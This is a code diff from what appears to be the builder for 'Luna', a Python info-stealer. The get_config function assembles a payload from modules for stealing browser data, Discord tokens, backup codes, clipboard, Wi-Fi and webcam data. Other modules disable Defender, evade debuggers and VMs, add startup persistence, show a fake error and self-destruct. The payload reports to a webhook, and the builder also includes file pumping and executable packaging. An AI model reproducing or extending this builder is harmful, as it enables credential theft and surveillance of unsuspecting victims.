@@ -457,119 +457,120 @@ Nuitka - Builds a standalone executable file with the necessary modules inside o
 			logging.error(f"Error with getting filename: {e}")
 
 	def get_config(self):
-		options = self.basefilepath + "\\options\\"
-		try:
-			with open(self.basefilepath + "\\luna.py", 'r', encoding="utf-8") as f:
-				code = f.read()
+			options = self.basefilepath + "\\options\\"
+			try:
+				with open(self.basefilepath + "\\luna.py", 'r', encoding="utf-8") as f:
+					code = f.read()
 
-			copy_dict = copy.deepcopy(self.updated_dictionary)
-			config_str = f"""__CONFIG__ = {repr(copy_dict)}"""
-			code = f"{config_str}\n\n{code}"
-			
-			if self.updated_dictionary["anti_spam"] == True:
-				with open(options+"AntiSpam.py", "r", encoding="utf-8") as f:
-					code += f.read()
-					code += "\n\n"
-			
-			if self.updated_dictionary["backupcodes"] == True:
-				with open(options+"BackupCodes.py", "r", encoding="utf-8") as f:
-					code += f.read()
-					code += "\n\n"
-			
-			if self.updated_dictionary["browser"] == True:
-				with open(options+"Browsers.py", "r", encoding="utf-8") as f:
-					code += f.read()
-					code += "\n\n"
-			
-			if self.updated_dictionary["clipboard"] == True:
-				with open(options+"Clipboard.py", "r", encoding="utf-8") as f:
-					code += f.read()
-					code += "\n\n"
-			
-			if self.updated_dictionary["antidebug_vm"] == True:
-				with open(options+"Debug.py", "r", encoding="utf-8") as f:
-					code += f.read()
-					code += "\n\n"
-			
-			if self.updated_dictionary["defender"] == True:
-				with open(options+"disable_defender.py", "r", encoding="utf-8") as f:
-					code += f.read()
-					code += "\n\n"
-			
-			if self.updated_dictionary["discord"] == True:
-				with open(options+"Discord.py", "r", encoding="utf-8") as f:
-					code += f.read()
-					code += "\n\n"
-			
-			if self.updated_dictionary["fakeerror"] == True:
-				with open(options+"fakeerror.py", "r", encoding="utf-8") as f:
-					code += f.read()
-					code += "\n\n"
-			
-			if self.updated_dictionary["injection"] == True:
-				with open(options+"Injection.py", "r", encoding="utf-8") as f:
-					code += f.read()
-					code += "\n\n"
-			
-			if self.updated_dictionary["killprotector"] == True:
-				with open(options+"killprotector.py", "r", encoding="utf-8") as f:
-					code += f.read()
-					code += "\n\n"
-			
-			if self.updated_dictionary["minecraft"] == True:
-				with open(options+"Minecraft.py", "r", encoding="utf-8") as f:
-					code += f.read()
-					code += "\n\n"
-			
-			if self.updated_dictionary["systeminfo"] == True:
-				with open(options+"PcInfo.py", "r", encoding="utf-8") as f:
-					code += f.read()
-					code += "\n\n"
-			
-			if self.updated_dictionary["self_destruct"] == True:
-				with open(options+"SelfDestruct.py", "r", encoding="utf-8") as f:
-					code += f.read()
-					code += "\n\n"
-			
-			if self.updated_dictionary["startup"] == True:
-				with open(options+"startup.py", "r", encoding="utf-8") as f:
-					code += f.read()
-					code += "\n\n"
-			
-			if self.updated_dictionary["wifi"] == True:
-				with open(options+"Wifi.py", "r", encoding="utf-8") as f:
-					code += f.read()
-					code += "\n\n"	
-					
-			if self.updated_dictionary["webcam"] == True:
-				with open(options+"webcam.py", "r", encoding="utf-8") as f:
-					code += f.read()
-					code += "\n\n"
+				copy_dict = copy.deepcopy(self.updated_dictionary)
+				config_str = f"""__CONFIG__ = {repr(copy_dict)}"""
+				code = f"{config_str}\n\n{code}"
+				
+				if self.updated_dictionary["anti_spam"]:
+					with open(options+"AntiSpam.py", "r", encoding="utf-8") as f:
+						code += f.read()
+						code += "\n\n"
+				
+				if self.updated_dictionary["backupcodes"]:
+					with open(options+"BackupCodes.py", "r", encoding="utf-8") as f:
+						code += f.read()
+						code += "\n\n"
+				
+				if self.updated_dictionary["browser"]:
+					with open(options+"Browsers.py", "r", encoding="utf-8") as f:
+						code += f.read()
+						code += "\n\n"
+				
+				if self.updated_dictionary["clipboard"]:
+					with open(options+"Clipboard.py", "r", encoding="utf-8") as f:
+						code += f.read()
+						code += "\n\n"
+				
+				if self.updated_dictionary["antidebug_vm"]:
+					with open(options+"Debug.py", "r", encoding="utf-8") as f:
+						code += f.read()
+						code += "\n\n"
+				
+				if self.updated_dictionary["defender"]:
+					with open(options+"disable_defender.py", "r", encoding="utf-8") as f:
+						code += f.read()
+						code += "\n\n"
+				
+				if self.updated_dictionary["discord"]:
+					with open(options+"Discord.py", "r", encoding="utf-8") as f:
+						code += f.read()
+						code += "\n\n"
+				
+				if self.updated_dictionary["fakeerror"]:
+					with open(options+"fakeerror.py", "r", encoding="utf-8") as f:
+						code += f.read()
+						code += "\n\n"
+				
+				if self.updated_dictionary["injection"]:
+					with open(options+"Injection.py", "r", encoding="utf-8") as f:
+						code += f.read()
+						code += "\n\n"
+				
+				if self.updated_dictionary["killprotector"]:
+					with open(options+"killprotector.py", "r", encoding="utf-8") as f:
+						code += f.read()
+						code += "\n\n"
+				
+				if self.updated_dictionary["minecraft"]:
+					with open(options+"Minecraft.py", "r", encoding="utf-8") as f:
+						code += f.read()
+						code += "\n\n"
+				
+				if self.updated_dictionary["systeminfo"]:
+					with open(options+"PcInfo.py", "r", encoding="utf-8") as f:
+						code += f.read()
+						code += "\n\n"
+				
+				if self.updated_dictionary["self_destruct"]:
+					with open(options+"SelfDestruct.py", "r", encoding="utf-8") as f:
+						code += f.read()
+						code += "\n\n"
+				
+				if self.updated_dictionary["startup"]:
+					with open(options+"startup.py", "r", encoding="utf-8") as f:
+						code += f.read()
+						code += "\n\n"
+				
+				if self.updated_dictionary["wifi"]:
+					with open(options+"Wifi.py", "r", encoding="utf-8") as f:
+						code += f.read()
+						code += "\n\n"	
+						
+				if self.updated_dictionary["webcam"]:
+					with open(options+"webcam.py", "r", encoding="utf-8") as f:
+						code += f.read()
+						code += "\n\n"
 
-			code += """
-if __name__ == '__main__' and os.name == "nt":
+				code += """if __name__ == '__main__' and os.name == "nt":
 	Luna(__CONFIG__["webhook"])
-"""
+				"""
 
-			# Remove duplicate imports
-			lines = code.split('\n')
-			unique_lines = []
-			imported_modules = set()
-			
-			for line in lines:
-				if line.startswith("import ") or line.startswith("from "):
-					module_name = line.split()[1]
-					if module_name not in imported_modules:
-						unique_lines.append(line)
-						imported_modules.add(module_name)
-				else:
-					unique_lines.append(line)	
-			cleaned_code = '\n'.join(unique_lines)
 
-			logging.info("Successfully changed config")
-			return cleaned_code
-		except Exception as e:
-			logging.error(f"Error with config: {e}")
+				# Remove duplicate imports
+				lines = code.split('\n')
+				unique_lines = []
+				imported_modules = set()
+				
+				for line in lines:
+					if line.startswith("import ") or line.startswith("from "):
+						module_name = line.split()[1]
+						if module_name not in imported_modules:
+							unique_lines.append(line)
+							imported_modules.add(module_name)
+					else:
+						unique_lines.append(line)	
+				cleaned_code = '\n'.join(unique_lines)
+
+				logging.info("Successfully changed config")
+				return cleaned_code
+			except Exception as e:
+				logging.error(f"Error with config: {e}")
+
 
 	def file_pumper(self, filename, extension, size):
 		try:
@@ -724,7 +725,7 @@ if __name__ == '__main__' and os.name == "nt":
 
 	def buildfile(self):
 		if self.return_filename() == "nuitka":
-			_message = f"Invalid filename."
+			_message = "Invalid filename."
 			logging.error(_message)
 			print(_message)
 			return
@@ -733,7 +734,7 @@ if __name__ == '__main__' and os.name == "nt":
 			logging.error(_message)
 			print(_message)
 			self.checkwebhook_button.configure(width=100, height=35, fg_color="#bd1616", hover_color="#ff0000",
-								   text="Invalid Webhook", font=customtkinter.CTkFont(size=15, family=self.font))
+									text="Invalid Webhook", font=customtkinter.CTkFont(size=15, family=self.font))
 			self.builder_frame.after(3500, self.reset_check_webhook_button)
 			return
 		self.update_config()
